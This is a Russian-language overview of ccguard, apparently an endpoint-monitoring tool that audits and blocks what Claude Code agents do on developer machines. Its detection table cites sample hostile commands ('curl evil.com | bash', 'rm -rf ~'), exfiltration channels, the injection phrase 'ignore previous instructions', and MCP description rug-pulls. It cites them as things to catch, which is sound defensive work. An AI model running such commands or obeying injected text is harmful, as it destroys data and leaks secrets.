# ccguard — обзор проекта и механик

> Снимок состояния на 2026-06-07. Что есть в проекте и как работают основные механики.

## Что это

**ccguard = EDR для AI-агентов на машинах разработчиков.** Классический EDR (CrowdStrike, SentinelOne) и AI-WAF (Lakera, Cisco AI Defense) не видят, что Claude Code делает на эндпоинте через Bash/Write/Edit. ccguard закрывает это слепое пятно: инвентаризирует, аудирует и блокирует конфигурацию и поведение Claude Code в организации.

Закрывает три gap'а у security-команды:
- **видимость** — какие MCP-серверы / skills / hooks / agents у кого стоят;
- **контроль** — запрет опасного централизованно через policy;
- **аудит** — лог того, что агент реально выполнял.

Это governance-слой, он **не** заменяет нативные permissions Claude Code и **не** претендует на sandbox-изоляцию. Целевая аудитория — AppSec/SecOps в финтехе, healthtech и гос-секторе.

## Архитектура: 4 компонента

```
┌─────────────── машина разработчика ───────────────┐      ┌──── центральный сервер ────┐
│  Claude Code                                       │      │  FastAPI + SQLModel        │
│   ├─ PreToolUse hook  → enforce (allow/deny <100мс)│ ───► │  SQLite (WAL)              │
│   ├─ PostToolUse hook → audit (сигналы в буфер)    │ POST │  движки детекта (services) │
│   └─ PostToolUse hook → findings (prompt injection)│      │  HTMX + Jinja2 UI          │
│  ccguard daemon (раз в 15 мин: scan + sync)        │ ◄─── │  policy + baselines        │
└────────────────────────────────────────────────────┘ GET └────────────────────────────┘
```

## Endpoint-агент (`src/ccguard/agent/`)

Трёхпроцессная модель с разными latency-бюджетами:

- **PreToolUse (enforce)** — `enforce.py:138 decide()`. Синхронный, блокирует tool use, бюджет **<100мс**. На каждый `Bash`/`mcp__*`/`WebFetch`/`WebSearch`: prompt-injection скан → dangerous bash patterns → suspicious network → решение `{permission, reason, rule_id, severity}`. В режиме `observe` deny переписывается в allow (но finding всё равно пишется).
- **PostToolUse (audit)** — `audit_hook/hook_main.py`. Асинхронный, fail-open, **<20мс**. Считает fingerprint от `tool_input`, извлекает **сигналы** (`cred.read.aws`, `egress.network_tool`, `exec.pipe_to_shell` — привязаны к MITRE ATT&CK), и **сразу дропает сырой ввод** (privacy-инвариант). Пишет в SQLite-буфер (WAL); при накоплении ≥50 строк спавнит детачированный flusher, который батчами шлёт на сервер.
- **PostToolUse (findings)** — `findings_hook/` — отдельный буфер для prompt-injection findings с DLQ-guard.
- **Daemon** — `daemon.py run_loop()`, интервал 900с. Делает полный `scan` (инвентарь `~/.claude/`) + `sync` (отправка inventory/findings/audit + забор policy по ETag). Запускается через launchd/systemd-user, с exponential backoff.

CLI (`cli.py`): `scan`, `check`, `sync`, `install`, `uninstall`, `enforce`.

Сканер инвентаря (`scan/`): mcp, hooks, skills, agents, commands, permissions, plugins, settings. Содержимое маскируется (секреты → плейсхолдеры, `masking.py`) и пути скрабятся (`/Users/x` → `~`) **до** отправки. `machine_id` = sha256(machine + uid + install_salt), стабилен между перезагрузками.

## Сервер (`src/ccguard/server/`)

FastAPI + SQLModel + SQLite WAL. Lifespan (`main.py`) поднимает scheduler (APScheduler, тик раз в час), который гоняет фоновые движки: risk decay, anomaly, sequence, discovery (threat feeds).

**API для агента** (`api/`): `POST /inventory`, `POST /audit`, `POST /findings`, `POST /scan-content` (LLM-скан), `GET /policy` (с ETag), `GET /scanner-config`, `GET /health`. Auth — sha256-хеш токена в заголовке `X-CCGuard-Token` (`deps.py require_token`).

**~30 таблиц** (`db/models.py`): Machine (+ heartbeat-поля ТЗ-07), InventorySnapshot, FindingRecord, PolicyVersion, AuditRecord, ToolUseEvent (+ `session_id`, `signals_json`), MachineRiskHistory, MachineUserRiskHistory, ProposedSignal, ScanResult, LLMCallLog, PolicyApplyEvent, SettingsRecord + четыре TOFU-baseline таблицы (MCPServerBaseline, HookBaseline, SkillBaseline, AgentBaseline) + MachineBaseline (anomaly). Таксономия/детект-склад (ТЗ-05/06/08/09): ThreatIndicator, Technique (atlas/attack/owasp), IndicatorTechniqueMapping, TechniqueCrosswalk, Detector, DetectorTechniqueMapping, ChainScenario, ChainStep, ChainMatch.

## Ключевые движки детекта (ядро ценности)

| Движок | Что ловит | Как |
|---|---|---|
| **MCP rug pull** | плагин обновил `description` на prompt injection | TOFU: хеш `description+command+args`, drift = block-алерт с diff «было/стало» |
| **Hook rug pull** | сторонний хук тихо подменил shim-скрипт, `settings.json` не менялся | sha256 содержимого файла; TOFU-baseline, любое изменение подсвечивается |
| **Skill / Agent baseline** | вредный `SKILL.md` или агент с `tools: Bash` | TOFU по хешу + LLM-скан содержимого с цитатой подозрительного куска; severity по dangerous-tools |
| **Dangerous bash** | `curl evil.com \| bash`, `rm -rf ~`, `chmod 777` | 8 default-правил, lru-cached regex, block/warn |
| **Suspicious network** | exfil через pastebin, Discord webhooks, IP-as-host, telegram | каталог хостов + парсер curl/wget URL из bash |
| **Prompt injection** | Read читает README с «ignore previous instructions» | PostToolUse скан 15-pattern catalog + опц. LlamaGuard; опц. PreToolUse block |
| **Anomaly (z-score)** | всплеск bash/tool-use относительно baseline | rolling mean+stddev на машину, sigma>2 → finding |
| **Risk score** | накопление подозрительной активности | decay-weighted сумма findings, daily snapshot, fleet-wide агрегация |
| **Sequence (IOA)** | staging-chain, exfil-sequence, external-trigger цепочки | session-scoped корреляция размеченных событий в окне; additive scoring + allowlist-suppression (ТЗ-01..04) |
| **Sensor self-protection** | агента тихо отключили / убрали hook | heartbeat раз в 15 мин; сервер: active/stale/silent с grace; детект по ОТСУТСТВИЮ сигнала → `sensor.silent` / `sensor.hooks_removed` (ТЗ-07) |
| **Chain scenarios** | структуру атаки по СТАДИЯМ kill-chain (ловит вариант до публикации) | универсальный движок-исполнитель: сценарии — ДАННЫЕ, шаг = стадия (любая техника/канал), окно+сессия, optional/order (ТЗ-09) |
| **Fleet divergence** | один skill с разными хешами по флоту = supply-chain | GROUP BY по денормализованным колонкам, DIVERGENT-бейдж в UI |

LLM-скан (`scan_service` + `llm_client`) — единственная внешняя зависимость (Anthropic API), опциональная, с кешем по `file_hash` и бюджет-лимитом. Source monitors (`source_monitors/`) тянут threat intel: MITRE ATT&CK, Lakera blog, Atlas, Atomic Red Team, CVE AI filter.

### Таксономия и карта покрытия (ТЗ-05/06/08)

Над движками — слой классификации: **три равных фреймворка** как проекции одного пространства угроз — ATLAS (`AML.T*`), ATT&CK (`T*`), OWASP ASI (`ASI01..ASI10`), связанные горизонтальным crosswalk (`ASI04 ≈ AML.T0010 ≈ T1195`). Детект двух типов привязывается к техникам: **индикаторы** (артефакт-правила: путь/команда/хост, тип контроля PREV/SCOPE) и **корреляции** (поведенческие детекторы → DETECT). `coverage_service` считает покрытие как объединение обоих + rollup под-техник; техники про модель/обучение помечены `in_scope=false` и не показываются как дыры. Это закрывает «парадокс»: IPI (`AML.T0051`) покрыт корреляцией `staging_chain`/`external_trigger`, а не индикатором. `coverage_by_control_type()` показывает, где **блокируем** (PREV), где **видим** (DETECT), где **ограничиваем** (SCOPE). Данные — выверенные seed-файлы (`data/*_seed.yaml`), не сетевая автозагрузка.

## UI (HTMX/Jinja2, `web/routes.py`)

- **Overview** — fleet dashboard + риск + recent findings
- **Machines / machine_detail** — инвентарь, findings, baseline-acceptance, risk-спарклайн
- **Findings feed** — фильтры по rule_id / severity / machine
- **Anomalies** — heatmap-матрица + drill-down (time series vs baseline)
- **Audit timeline** — deny / fail_open события
- **Policy editor** — YAML draft → publish → rollback + mandatory patterns
- **Proposed signals** — LLM драфтит regex-сигнатуры на approve админа
- **Skills inventory** — fleet-агрегация skills/agents с divergence-детектом
- **Settings** — токены, enforcement-mode (observe/block), LLM-бюджет, пароль

## Tech-стек и ограничения (v0.2)

- Python 3.12, FastAPI, SQLModel, SQLite WAL, HTMX + Jinja, Docker.
- Self-hosted on-prem; единственная внешняя зависимость — Anthropic API (опционально).
- Single-tenant (multi-tenant → v0.3); SQLite до ~100 машин (Postgres → v0.3).
- Backward compat: agent v0.1 работает против server v0.2 (graceful degradation).
- PreToolUse hook latency <100мс. Security at rest: хеши или Fernet через `SECRET_KEY`.

## Текущий статус

- **v0.2** «Behavioral EDR + Compliance» — 5 фаз завершены: tool-use audit, anomaly detection, LLM content scanner, push-install, prompt-injection.
- Затем **TOFU baseline для hooks** → **skills/agents baseline** → fleet skills-inventory.
- Затем детект-склад: **threat-indicator catalog** (ТЗ-05) → **карта покрытия** ATLAS/ATT&CK/OWASP ASI с привязкой индикаторов и корреляций к техникам (ТЗ-06/08) → **sensor self-protection** heartbeat (ТЗ-07) → **универсальный chain-движок** цепочек по стадиям как данные (ТЗ-09). sequence_service/enforce/scoring при этом не трогались — только модель данных + надстройка.
- **Прод**: https://ccguard.swagasecurity.com (Caddy + Cloudflare), 2 машины во флоте.
- **Тесты**: ~1443 (925 unit / 482 integration / 15 e2e-gated через `CCGUARD_E2E=1`), полный регресс зелёный.
- Позиционирование сейчас: персональный guardrail для «вайбкодера»; движки детекта — главная ценность, не полноценный SOC.

## Дальше (roadmap)

- v0.2: PyInstaller-сборка enforce-бинарника (<100мс).
- v0.3: Sigstore/cosign подписи скиллов и плагинов; multi-tenant; Postgres.
- v0.4: разные policy по командам/проектам.
- v0.5: Cursor / Codex (та же модель governance, другие источники конфига).
